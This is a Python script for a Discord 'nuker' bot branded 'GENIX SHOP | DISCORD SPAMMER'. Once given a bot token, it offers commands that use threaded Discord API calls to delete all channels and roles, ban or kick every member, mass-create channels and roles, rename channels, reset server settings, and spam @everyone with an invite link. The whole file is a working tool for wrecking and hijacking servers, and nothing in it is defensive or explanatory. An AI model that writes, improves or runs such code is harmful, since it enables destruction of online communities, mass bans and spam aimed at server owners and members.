import os
import threading

try:
	import discord
	import requests
	from discord.ext import commands
except ImportError:
	os.system("pip install discord")
	os.system("pip install requests")

color_1 = "\x1b[00m"
color_2 = "\x1b[31m"
color_3 = "\x1b[32m"
color_4 = "\x1b[33m"
color_5 = "\x1b[34m"
color_6 = "\x1b[35m"
color_7 = "\x1b[36m"

command_banner = f"""
		{color_5}┏━┓┏━┓┏━━━┓┏━━━┓┏┓━┏┓┏━━┓┏━┓━┏┓┏━━━┓
		┃┃┗┛┃┃┃┏━┓┃┃┏━┓┃┃┃━┃┃┗┫┣┛┃┃┗┓┃┃┃┏━━┛
		{color_1}┃┏┓┏┓┃┃┃━┃┃┃┃━┗┛┃┗━┛┃━┃┃━┃┏┓┗┛┃┃┗━━┓
		┃┃┃┃┃┃┃┗━┛┃┃┃━┏┓┃┏━┓┃━┃┃━┃┃┗┓┃┃┃┏━━┛
		{color_5}┃┃┃┃┃┃┃┏━┓┃┃┗━┛┃┃┃━┃┃┏┫┣┓┃┃━┃┃┃┃┗━━┓
		┗┛┗┛┗┛┗┛━┗┛┗━━━┛┗┛━┗┛┗━━┛┗┛━┗━┛┗━━━┛
{color_2}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                      {color_4}<---- {color_3}[ {color_1}COMMANDS {color_3}] {color_4}---->
  
  {color_3}        1) {color_7}Delete Channels                   $clear
  {color_3}        2) {color_7}Create Channels                   $newc
  {color_3}        3) {color_7}Delete Roles                      $cleard
  {color_3}        4) {color_7}Create Roles                      $newd
  {color_3}        5) {color_7}Ban All                           $block
  {color_3}        6) {color_7}Kick All                          $kblock
  {color_3}        7) {color_7}Spam Message                      $spamc
  {color_3}        8) {color_7}Rename Channels                   $rename
  {color_3}        9) {color_7}Server Auto Attacking             $autoplay
  
{color_2}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

def run(tokens):
	
	bot = commands.Bot(command_prefix="$", intents=discord.Intents.all())
	
	@bot.event
	async def on_ready():
		os.system("clear")
		print(command_banner)
		
	@bot.command()
	async def newc(ctx):
		await ctx.message.delete()
		def attack(guild,token):
			requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": f"Bot {token}"},json={"type":0,"name":"genixshop","permission_overwrites":[]})
		for _ in range(50+1):
			threading.Thread(target=attack, args=[ctx.guild.id,tokens]).start()
			
	
	@bot.command()
	async def clear(ctx):
		await ctx.message.delete()
		for channel in ctx.guild.channels:
			try:
				def attack(id,token):
					requests.delete(f"https://discord.com/api/v9/channels/{id}",headers={"authorization": f"Bot {token}"})
				threading.Thread(target=attack, args=[channel.id,tokens]).start()
			except:
				pass
		
	@bot.command()
	async def cleard(ctx):
		await ctx.message.delete()
		for role in ctx.guild.roles:
			try:
				def attack(guild,id,token):
					requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{id}",headers={"authorization": f"Bot {token}"})
				threading.Thread(target=attack, args=[ctx.guild.id,role.id,tokens]).start()
			except:
				pass
	
	@bot.command()
	async def newd(ctx):
		await ctx.message.delete()
		def attack(guild,token):
			requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles",headers={"authorization": f"Bot {token}"},json={"name":"GENIX SHOP","color":0,"permissions":"0"})
		for _ in range(20):
			threading.Thread(target=attack, args=[ctx.guild.id,tokens]).start()
			
	@bot.command()
	async def block(ctx):
		await ctx.message.delete()
		for member in ctx.guild.members:
			try:
				def attack(guild,id,token):
					requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{id}",json={"delete_message_seconds": 3600},headers={"authorization": "Bot "+ token})
				threading.Thread(target=attack, args=[ctx.guild.id,member.id,tokens]).start()
			except:
				pass
				
	@bot.command()
	async def kblock(ctx):
		await ctx.message.delete()
		for member in ctx.guild.members:
			try:
				def attack(guild,id,token):
					requests.delete(f"https://discord.com/api/v9/guilds/{guild}/members/{id}",headers={"authorization": f"Bot {token}"})
				threading.Thread(target=attack, args=[ctx.guild.id,member.id,tokens]).start()
			except:
				pass
				
	@bot.command()
	async def spamc(ctx):
		await ctx.message.delete()
		for _ in range(10):
			for channel in ctx.guild.text_channels:
				try:
					def attack(id,token):
						requests.post(f"https://discord.com/api/v9/channels/{id}/messages",headers={"authorization": f"Bot {token}"},json={"content": "@everyone @here\nhttps://discord.gg/XyJG87495q"})
					threading.Thread(target=attack, args=[channel.id,tokens]).start()
				except:
					pass
		
	@bot.command()
	async def rename(ctx):
		await ctx.message.delete()
		for channel in ctx.guild.channels:
			try:
				def attack(id,token):
					requests.patch(f"https://discord.com/api/v9/channels/{id}",headers={"authorization": f"Bot {token}"},json={"name":"genixshop_edition","type":0,"topic":"","bitrate":64000,"user_limit":0,"nsfw":False,"flags":0,"rate_limit_per_user":0})
				threading.Thread(target=attack, args=[channel.id,tokens]).start()
			except:
				pass
	
	@bot.command()
	async def autoplay(ctx):
		await ctx.message.delete()
		requests.patch(f"https://discord.com/api/v9/guilds/{ctx.guild.id}",headers={"authorization": f"Bot {tokens}"},json={"name":"GENIX SHOP | CallBack","description":None,"icon":None,"splash":None,"banner":None,"home_header":None,"afk_channel_id":None,"afk_timeout":300,"system_channel_id":None,"verification_level":0,"default_message_notifications":0,"explicit_content_filter":0,"system_channel_flags":0,"public_updates_channel_id":None,"safety_alerts_channel_id":None,"premium_progress_bar_enabled":False})
		for channel in ctx.guild.channels:
			try:
				def attack(id,token):
					requests.delete(f"https://discord.com/api/v9/channels/{id}",headers={"authorization": f"Bot {token}"})
				threading.Thread(target=attack, args=[channel.id,tokens]).start()
			except:
				def attack(guild,token):
					requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": f"Bot {token}"},json={"type":0,"name":"genixshop","permission_overwrites":[]})
				for _ in range(50+1):
					threading.Thread(target=attack, args=[ctx.guild.id,tokens]).start()
		def attack(guild,token):
			requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers={"authorization": f"Bot {token}"},json={"type":0,"name":"genixshop","permission_overwrites":[]})
		for _ in range(50+1):
			threading.Thread(target=attack, args=[ctx.guild.id,tokens]).start()
			
		
		
		
	bot.run(tokens)
	


def home():
	os.system("clear")
	print("      CREATE BY GENIX SHOP | DISCORD SPAMMER")
	print()
	token = input("  [>] TOKEN  : ")
	print()
	
	if token == "":
		home()
	else:
		run(token)
	
	
	
home()








